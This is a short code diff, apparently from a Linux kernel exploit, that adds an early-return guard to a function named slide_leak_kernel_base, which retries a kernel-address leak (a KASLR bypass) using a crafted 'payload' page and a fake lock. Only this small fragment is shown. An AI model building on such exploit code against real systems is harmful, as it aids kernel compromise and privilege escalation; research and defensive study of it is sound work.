@@ -403,6 +403,10 @@ uint64_t slide_child_leak_stext(void) {
 }
 
 int slide_leak_kernel_base(void) {
+  if (kaslr_done) {
+    pr_info("slide-kaslr already resolved base=%016zx\n", kaslr_base);
+    return 1;
+  }
   for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
     page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
     if (!page_base || !fake_lock) {
